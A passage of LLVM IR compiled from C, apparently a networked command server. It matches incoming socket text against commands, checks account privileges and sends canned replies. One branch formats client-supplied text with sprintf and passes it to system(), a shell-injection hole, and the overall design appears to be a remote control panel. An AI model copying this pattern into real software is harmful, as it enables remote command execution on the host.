  %1460 = getelementptr inbounds [20 x i8], [20 x i8]* %1459, i32 0, i32 0
  %1461 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1462 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %1455, i8* getelementptr inbounds ([94 x i8], [94 x i8]* @.str.130, i32 0, i32 0), i8* %1460, i8* %1461)
  %1463 = load %struct._IO_FILE*, %struct._IO_FILE** %100, align 8
  %1464 = call i32 @fclose(%struct._IO_FILE* %1463)
  br label %2115

; <label>:1465:                                   ; preds = %1442
  %1466 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1467 = call i8* @strstr(i8* %1466, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.131, i32 0, i32 0)) #8
  %1468 = icmp ne i8* %1467, null
  br i1 %1468, label %1473, label %1469

; <label>:1469:                                   ; preds = %1465
  %1470 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1471 = call i8* @strstr(i8* %1470, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.132, i32 0, i32 0)) #8
  %1472 = icmp ne i8* %1471, null
  br i1 %1472, label %1473, label %1484

; <label>:1473:                                   ; preds = %1469, %1465
  %1474 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1475 = call i32 (i8*, i8*, ...) @sprintf(i8* %1474, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.133, i32 0, i32 0)) #7
  %1476 = load i32, i32* %4, align 4
  %1477 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1478 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1479 = call i64 @strlen(i8* %1478) #8
  %1480 = call i64 @send(i32 %1476, i8* %1477, i64 %1479, i32 16384)
  %1481 = icmp eq i64 %1480, -1
  br i1 %1481, label %1482, label %1483

; <label>:1482:                                   ; preds = %1473
  store i8* null, i8** %2, align 8
  br label %2126

; <label>:1483:                                   ; preds = %1473
  br label %1484

; <label>:1484:                                   ; preds = %1483, %1469
  %1485 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1486 = call i8* @strstr(i8* %1485, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.134, i32 0, i32 0)) #8
  %1487 = icmp ne i8* %1486, null
  br i1 %1487, label %1488, label %1499

; <label>:1488:                                   ; preds = %1484
  %1489 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1490 = call i32 (i8*, i8*, ...) @sprintf(i8* %1489, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.135, i32 0, i32 0)) #7
  %1491 = load i32, i32* %4, align 4
  %1492 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1493 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1494 = call i64 @strlen(i8* %1493) #8
  %1495 = call i64 @send(i32 %1491, i8* %1492, i64 %1494, i32 16384)
  %1496 = icmp eq i64 %1495, -1
  br i1 %1496, label %1497, label %1498

; <label>:1497:                                   ; preds = %1488
  store i8* null, i8** %2, align 8
  br label %2126

; <label>:1498:                                   ; preds = %1488
  br label %1499

; <label>:1499:                                   ; preds = %1498, %1484
  %1500 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1501 = call i8* @strstr(i8* %1500, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.136, i32 0, i32 0)) #8
  %1502 = icmp ne i8* %1501, null
  br i1 %1502, label %1503, label %1514

; <label>:1503:                                   ; preds = %1499
  %1504 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1505 = call i32 (i8*, i8*, ...) @sprintf(i8* %1504, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.137, i32 0, i32 0)) #7
  %1506 = load i32, i32* %4, align 4
  %1507 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1508 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1509 = call i64 @strlen(i8* %1508) #8
  %1510 = call i64 @send(i32 %1506, i8* %1507, i64 %1509, i32 16384)
  %1511 = icmp eq i64 %1510, -1
  br i1 %1511, label %1512, label %1513

; <label>:1512:                                   ; preds = %1503
  store i8* null, i8** %2, align 8
  br label %2126

; <label>:1513:                                   ; preds = %1503
  br label %1514

; <label>:1514:                                   ; preds = %1513, %1499
  %1515 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1516 = call i8* @strstr(i8* %1515, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.138, i32 0, i32 0)) #8
  %1517 = icmp ne i8* %1516, null
  br i1 %1517, label %1522, label %1518

; <label>:1518:                                   ; preds = %1514
  %1519 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1520 = call i8* @strstr(i8* %1519, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.139, i32 0, i32 0)) #8
  %1521 = icmp ne i8* %1520, null
  br i1 %1521, label %1522, label %1564

; <label>:1522:                                   ; preds = %1518, %1514
  %1523 = load i8*, i8** %12, align 8
  %1524 = load i32, i32* %5, align 4
  %1525 = sext i32 %1524 to i64
  %1526 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1525
  %1527 = getelementptr inbounds %struct.account, %struct.account* %1526, i32 0, i32 2
  %1528 = getelementptr inbounds [20 x i8], [20 x i8]* %1527, i32 0, i32 0
  %1529 = call i32 @strcmp(i8* %1523, i8* %1528) #8
  %1530 = icmp eq i32 %1529, 0
  br i1 %1530, label %1531, label %1552

; <label>:1531:                                   ; preds = %1522
  %1532 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1533 = call i8* @strtok(i8* %1532, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.140, i32 0, i32 0)) #7
  store i8* %1533, i8** %102, align 8
  %1534 = load i8*, i8** %102, align 8
  %1535 = getelementptr inbounds i8, i8* %1534, i64 8
  store i8* %1535, i8** %103, align 8
  %1536 = load i8*, i8** %103, align 8
  call void @trim(i8* %1536)
  %1537 = load i8*, i8** %103, align 8
  %1538 = getelementptr inbounds [100 x i8*], [100 x i8*]* %101, i32 0, i32 0
  %1539 = call i32 (i8*, i8**, ...) bitcast (i32 (...)* @resolve to i32 (i8*, i8**, ...)*)(i8* %1537, i8** %1538)
  %1540 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1541 = load i8*, i8** %103, align 8
  %1542 = getelementptr inbounds [100 x i8*], [100 x i8*]* %101, i32 0, i32 0
  %1543 = call i32 (i8*, i8*, ...) @sprintf(i8* %1540, i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.141, i32 0, i32 0), i8* %1541, i8** %1542) #7
  %1544 = load i32, i32* %4, align 4
  %1545 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1546 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1547 = call i64 @strlen(i8* %1546) #8
  %1548 = call i64 @send(i32 %1544, i8* %1545, i64 %1547, i32 16384)
  %1549 = icmp eq i64 %1548, -1
  br i1 %1549, label %1550, label %1551

; <label>:1550:                                   ; preds = %1531
  store i8* null, i8** %2, align 8
  br label %2126

; <label>:1551:                                   ; preds = %1531
  br label %1563

; <label>:1552:                                   ; preds = %1522
  %1553 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1554 = call i32 (i8*, i8*, ...) @sprintf(i8* %1553, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.142, i32 0, i32 0)) #7
  %1555 = load i32, i32* %4, align 4
  %1556 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1557 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1558 = call i64 @strlen(i8* %1557) #8
  %1559 = call i64 @send(i32 %1555, i8* %1556, i64 %1558, i32 16384)
  %1560 = icmp eq i64 %1559, -1
  br i1 %1560, label %1561, label %1562

; <label>:1561:                                   ; preds = %1552
  br label %1562

; <label>:1562:                                   ; preds = %1561, %1552
  br label %1563

; <label>:1563:                                   ; preds = %1562, %1551
  br label %1564

; <label>:1564:                                   ; preds = %1563, %1518
  %1565 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1566 = call i8* @strstr(i8* %1565, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.143, i32 0, i32 0)) #8
  %1567 = icmp ne i8* %1566, null
  br i1 %1567, label %1572, label %1568

; <label>:1568:                                   ; preds = %1564
  %1569 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1570 = call i8* @strstr(i8* %1569, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.144, i32 0, i32 0)) #8
  %1571 = icmp ne i8* %1570, null
  br i1 %1571, label %1572, label %1629

; <label>:1572:                                   ; preds = %1568, %1564
  %1573 = load i8*, i8** %12, align 8
  %1574 = load i32, i32* %5, align 4
  %1575 = sext i32 %1574 to i64
  %1576 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1575
  %1577 = getelementptr inbounds %struct.account, %struct.account* %1576, i32 0, i32 2
  %1578 = getelementptr inbounds [20 x i8], [20 x i8]* %1577, i32 0, i32 0
  %1579 = call i32 @strcmp(i8* %1573, i8* %1578) #8
  %1580 = icmp eq i32 %1579, 0
  br i1 %1580, label %1581, label %1617

; <label>:1581:                                   ; preds = %1572
  %1582 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1583 = call i8* @strtok(i8* %1582, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.140, i32 0, i32 0)) #7
  store i8* %1583, i8** %104, align 8
  %1584 = load i8*, i8** %104, align 8
  %1585 = getelementptr inbounds i8, i8* %1584, i64 8
  store i8* %1585, i8** %105, align 8
  %1586 = load i8*, i8** %105, align 8
  call void @trim(i8* %1586)
  %1587 = getelementptr inbounds [50 x i8*], [50 x i8*]* %106, i32 0, i32 0
  %1588 = bitcast i8** %1587 to i8*
  %1589 = load i8*, i8** %105, align 8
  %1590 = call i32 (i8*, i8*, ...) @sprintf(i8* %1588, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.145, i32 0, i32 0), i8* %1589) #7
  %1591 = getelementptr inbounds [50 x i8*], [50 x i8*]* %106, i32 0, i32 0
  %1592 = bitcast i8** %1591 to i8*
  %1593 = call i32 @system(i8* %1592)
  %1594 = load i32, i32* %5, align 4
  %1595 = sext i32 %1594 to i64
  %1596 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1595
  %1597 = getelementptr inbounds %struct.account, %struct.account* %1596, i32 0, i32 0
  %1598 = getelementptr inbounds [20 x i8], [20 x i8]* %1597, i32 0, i32 0
  %1599 = load i8*, i8** %105, align 8
  %1600 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.146, i32 0, i32 0), i8* %1598, i8* %1599)
  %1601 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1602 = load i32, i32* %5, align 4
  %1603 = sext i32 %1602 to i64
  %1604 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1603
  %1605 = getelementptr inbounds %struct.account, %struct.account* %1604, i32 0, i32 0
  %1606 = getelementptr inbounds [20 x i8], [20 x i8]* %1605, i32 0, i32 0
  %1607 = load i8*, i8** %105, align 8
  %1608 = call i32 (i8*, i8*, ...) @sprintf(i8* %1601, i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.147, i32 0, i32 0), i8* %1606, i8* %1607) #7
  %1609 = load i32, i32* %4, align 4
  %1610 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1611 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1612 = call i64 @strlen(i8* %1611) #8
  %1613 = call i64 @send(i32 %1609, i8* %1610, i64 %1612, i32 16384)
  %1614 = icmp eq i64 %1613, -1
  br i1 %1614, label %1615, label %1616

; <label>:1615:                                   ; preds = %1581
  store i8* null, i8** %2, align 8
  br label %2126

; <label>:1616:                                   ; preds = %1581
  br label %1628

; <label>:1617:                                   ; preds = %1572
  %1618 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1619 = call i32 (i8*, i8*, ...) @sprintf(i8* %1618, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.142, i32 0, i32 0)) #7
  %1620 = load i32, i32* %4, align 4
  %1621 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1622 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1623 = call i64 @strlen(i8* %1622) #8
  %1624 = call i64 @send(i32 %1620, i8* %1621, i64 %1623, i32 16384)
  %1625 = icmp eq i64 %1624, -1
  br i1 %1625, label %1626, label %1627

; <label>:1626:                                   ; preds = %1617
  br label %1627

; <label>:1627:                                   ; preds = %1626, %1617
  br label %1628

; <label>:1628:                                   ; preds = %1627, %1616
  br label %1629

; <label>:1629:                                   ; preds = %1628, %1568
  %1630 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1631 = call i8* @strstr(i8* %1630, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.148, i32 0, i32 0)) #8
  %1632 = icmp ne i8* %1631, null
  br i1 %1632, label %1633, label %1644

; <label>:1633:                                   ; preds = %1629
  %1634 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1635 = call i32 (i8*, i8*, ...) @sprintf(i8* %1634, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.149, i32 0, i32 0)) #7
  %1636 = load i32, i32* %4, align 4
  %1637 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1638 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1639 = call i64 @strlen(i8* %1638) #8
  %1640 = call i64 @send(i32 %1636, i8* %1637, i64 %1639, i32 16384)
  %1641 = icmp eq i64 %1640, -1
  br i1 %1641, label %1642, label %1643

; <label>:1642:                                   ; preds = %1633
  store i8* null, i8** %2, align 8
  br label %2126

; <label>:1643:                                   ; preds = %1633
  br label %1644

; <label>:1644:                                   ; preds = %1643, %1629
  %1645 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1646 = call i8* @strstr(i8* %1645, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.150, i32 0, i32 0)) #8
  %1647 = icmp ne i8* %1646, null
  br i1 %1647, label %1648, label %1659

; <label>:1648:                                   ; preds = %1644
  %1649 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1650 = call i32 (i8*, i8*, ...) @sprintf(i8* %1649, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.151, i32 0, i32 0)) #7
  %1651 = load i32, i32* %4, align 4
  %1652 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1653 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1654 = call i64 @strlen(i8* %1653) #8
  %1655 = call i64 @send(i32 %1651, i8* %1652, i64 %1654, i32 16384)
  %1656 = icmp eq i64 %1655, -1
  br i1 %1656, label %1657, label %1658

; <label>:1657:                                   ; preds = %1648
  store i8* null, i8** %2, align 8
  br label %2126

; <label>:1658:                                   ; preds = %1648
  br label %1659

; <label>:1659:                                   ; preds = %1658, %1644
  %1660 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1661 = call i8* @strstr(i8* %1660, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.152, i32 0, i32 0)) #8
  %1662 = icmp ne i8* %1661, null
  br i1 %1662, label %1663, label %1674

; <label>:1663:                                   ; preds = %1659
  %1664 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1665 = call i32 (i8*, i8*, ...) @sprintf(i8* %1664, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.151, i32 0, i32 0)) #7
  %1666 = load i32, i32* %4, align 4
  %1667 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1668 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1669 = call i64 @strlen(i8* %1668) #8
  %1670 = call i64 @send(i32 %1666, i8* %1667, i64 %1669, i32 16384)
  %1671 = icmp eq i64 %1670, -1
  br i1 %1671, label %1672, label %1673

; <label>:1672:                                   ; preds = %1663
  store i8* null, i8** %2, align 8
  br label %2126

; <label>:1673:                                   ; preds = %1663
  br label %1674

; <label>:1674:                                   ; preds = %1673, %1659
  %1675 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1676 = call i8* @strstr(i8* %1675, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.153, i32 0, i32 0)) #8
  %1677 = icmp ne i8* %1676, null
  br i1 %1677, label %1678, label %1689

; <label>:1678:                                   ; preds = %1674
  %1679 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1680 = call i32 (i8*, i8*, ...) @sprintf(i8* %1679, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.151, i32 0, i32 0)) #7
  %1681 = load i32, i32* %4, align 4
  %1682 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1683 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1684 = call i64 @strlen(i8* %1683) #8
  %1685 = call i64 @send(i32 %1681, i8* %1682, i64 %1684, i32 16384)
  %1686 = icmp eq i64 %1685, -1
  br i1 %1686, label %1687, label %1688

; <label>:1687:                                   ; preds = %1678
  store i8* null, i8** %2, align 8
  br label %2126

; <label>:1688:                                   ; preds = %1678
  br label %1689

; <label>:1689:                                   ; preds = %1688, %1674
  %1690 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1691 = call i8* @strstr(i8* %1690, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.154, i32 0, i32 0)) #8
  %1692 = icmp ne i8* %1691, null
  br i1 %1692, label %1693, label %1704

; <label>:1693:                                   ; preds = %1689
  %1694 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1695 = call i32 (i8*, i8*, ...) @sprintf(i8* %1694, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.155, i32 0, i32 0)) #7
  %1696 = load i32, i32* %4, align 4
  %1697 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1698 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1699 = call i64 @strlen(i8* %1698) #8
  %1700 = call i64 @send(i32 %1696, i8* %1697, i64 %1699, i32 16384)
  %1701 = icmp eq i64 %1700, -1
  br i1 %1701, label %1702, label %1703

; <label>:1702:                                   ; preds = %1693
  store i8* null, i8** %2, align 8
  br label %2126

; <label>:1703:                                   ; preds = %1693
  br label %1704

; <label>:1704:                                   ; preds = %1703, %1689
  %1705 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1706 = call i8* @strstr(i8* %1705, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.156, i32 0, i32 0)) #8
  %1707 = icmp ne i8* %1706, null
  br i1 %1707, label %1708, label %1719

; <label>:1708:                                   ; preds = %1704
  %1709 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1710 = call i32 (i8*, i8*, ...) @sprintf(i8* %1709, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.157, i32 0, i32 0)) #7
  %1711 = load i32, i32* %4, align 4
  %1712 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1713 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1714 = call i64 @strlen(i8* %1713) #8
  %1715 = call i64 @send(i32 %1711, i8* %1712, i64 %1714, i32 16384)
  %1716 = icmp eq i64 %1715, -1
  br i1 %1716, label %1717, label %1718

; <label>:1717:                                   ; preds = %1708
  store i8* null, i8** %2, align 8
  br label %2126

; <label>:1718:                                   ; preds = %1708
  br label %1719

; <label>:1719:                                   ; preds = %1718, %1704
  %1720 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1721 = call i8* @strstr(i8* %1720, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.158, i32 0, i32 0)) #8
  %1722 = icmp ne i8* %1721, null
  br i1 %1722, label %1723, label %1734

; <label>:1723:                                   ; preds = %1719
  %1724 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1725 = call i32 (i8*, i8*, ...) @sprintf(i8* %1724, i8* getelementptr inbounds ([124 x i8], [124 x i8]* @.str.159, i32 0, i32 0)) #7
  %1726 = load i32, i32* %4, align 4
  %1727 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1728 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1729 = call i64 @strlen(i8* %1728) #8
  %1730 = call i64 @send(i32 %1726, i8* %1727, i64 %1729, i32 16384)
  %1731 = icmp eq i64 %1730, -1
  br i1 %1731, label %1732, label %1733

; <label>:1732:                                   ; preds = %1723
  store i8* null, i8** %2, align 8
  br label %2126

; <label>:1733:                                   ; preds = %1723
  br label %1734

; <label>:1734:                                   ; preds = %1733, %1719
  %1735 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1736 = call i8* @strstr(i8* %1735, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.160, i32 0, i32 0)) #8
  %1737 = icmp ne i8* %1736, null
  br i1 %1737, label %1738, label %1749

; <label>:1738:                                   ; preds = %1734
  %1739 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1740 = call i32 (i8*, i8*, ...) @sprintf(i8* %1739, i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.161, i32 0, i32 0)) #7
  %1741 = load i32, i32* %4, align 4
  %1742 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1743 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1744 = call i64 @strlen(i8* %1743) #8
  %1745 = call i64 @send(i32 %1741, i8* %1742, i64 %1744, i32 16384)
  %1746 = icmp eq i64 %1745, -1
  br i1 %1746, label %1747, label %1748

; <label>:1747:                                   ; preds = %1738
  store i8* null, i8** %2, align 8
  br label %2126

; <label>:1748:                                   ; preds = %1738
  br label %1749

; <label>:1749:                                   ; preds = %1748, %1734
  %1750 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1751 = call i8* @strstr(i8* %1750, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.162, i32 0, i32 0)) #8
  %1752 = icmp ne i8* %1751, null
  br i1 %1752, label %1753, label %1764

; <label>:1753:                                   ; preds = %1749
  %1754 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1755 = call i32 (i8*, i8*, ...) @sprintf(i8* %1754, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.163, i32 0, i32 0)) #7
  %1756 = load i32, i32* %4, align 4
  %1757 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1758 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1759 = call i64 @strlen(i8* %1758) #8
  %1760 = call i64 @send(i32 %1756, i8* %1757, i64 %1759, i32 16384)
  %1761 = icmp eq i64 %1760, -1
  br i1 %1761, label %1762, label %1763

; <label>:1762:                                   ; preds = %1753
  store i8* null, i8** %2, align 8
  br label %2126

; <label>:1763:                                   ; preds = %1753
  br label %1764

; <label>:1764:                                   ; preds = %1763, %1749
  %1765 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1766 = call i8* @strstr(i8* %1765, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.164, i32 0, i32 0)) #8
  %1767 = icmp ne i8* %1766, null
  br i1 %1767, label %1768, label %1779

; <label>:1768:                                   ; preds = %1764
  %1769 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1770 = call i32 (i8*, i8*, ...) @sprintf(i8* %1769, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.165, i32 0, i32 0)) #7
  %1771 = load i32, i32* %4, align 4
  %1772 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1773 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1774 = call i64 @strlen(i8* %1773) #8
  %1775 = call i64 @send(i32 %1771, i8* %1772, i64 %1774, i32 16384)
  %1776 = icmp eq i64 %1775, -1
  br i1 %1776, label %1777, label %1778

; <label>:1777:                                   ; preds = %1768
  store i8* null, i8** %2, align 8
  br label %2126

; <label>:1778:                                   ; preds = %1768
  br label %1779

; <label>:1779:                                   ; preds = %1778, %1764
  %1780 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1781 = call i8* @strstr(i8* %1780, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.166, i32 0, i32 0)) #8
  %1782 = icmp ne i8* %1781, null
  br i1 %1782, label %1783, label %1794

; <label>:1783:                                   ; preds = %1779
  %1784 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1785 = call i32 (i8*, i8*, ...) @sprintf(i8* %1784, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.167, i32 0, i32 0)) #7
  %1786 = load i32, i32* %4, align 4
  %1787 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1788 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1789 = call i64 @strlen(i8* %1788) #8
  %1790 = call i64 @send(i32 %1786, i8* %1787, i64 %1789, i32 16384)
  %1791 = icmp eq i64 %1790, -1
  br i1 %1791, label %1792, label %1793

; <label>:1792:                                   ; preds = %1783
  store i8* null, i8** %2, align 8
  br label %2126

; <label>:1793:                                   ; preds = %1783
  br label %1794

; <label>:1794:                                   ; preds = %1793, %1779
  %1795 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1796 = call i8* @strstr(i8* %1795, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.168, i32 0, i32 0)) #8
  %1797 = icmp ne i8* %1796, null
  br i1 %1797, label %1798, label %1809

; <label>:1798:                                   ; preds = %1794
  %1799 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1800 = call i32 (i8*, i8*, ...) @sprintf(i8* %1799, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.169, i32 0, i32 0)) #7
  %1801 = load i32, i32* %4, align 4
  %1802 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1803 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1804 = call i64 @strlen(i8* %1803) #8
  %1805 = call i64 @send(i32 %1801, i8* %1802, i64 %1804, i32 16384)
  %1806 = icmp eq i64 %1805, -1
  br i1 %1806, label %1807, label %1808

; <label>:1807:                                   ; preds = %1798
  store i8* null, i8** %2, align 8
  br label %2126

; <label>:1808:                                   ; preds = %1798
  br label %1809

; <label>:1809:                                   ; preds = %1808, %1794
  %1810 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1811 = call i8* @strstr(i8* %1810, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.170, i32 0, i32 0)) #8
  %1812 = icmp ne i8* %1811, null
  br i1 %1812, label %1813, label %1824

; <label>:1813:                                   ; preds = %1809
  %1814 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1815 = call i32 (i8*, i8*, ...) @sprintf(i8* %1814, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.171, i32 0, i32 0)) #7
  %1816 = load i32, i32* %4, align 4
  %1817 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1818 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1819 = call i64 @strlen(i8* %1818) #8
  %1820 = call i64 @send(i32 %1816, i8* %1817, i64 %1819, i32 16384)
  %1821 = icmp eq i64 %1820, -1
  br i1 %1821, label %1822, label %1823

; <label>:1822:                                   ; preds = %1813
  store i8* null, i8** %2, align 8
  br label %2126

; <label>:1823:                                   ; preds = %1813
  br label %1824

; <label>:1824:                                   ; preds = %1823, %1809
  %1825 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1826 = call i8* @strstr(i8* %1825, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.172, i32 0, i32 0)) #8
  %1827 = icmp ne i8* %1826, null
  br i1 %1827, label %1828, label %1839

; <label>:1828:                                   ; preds = %1824
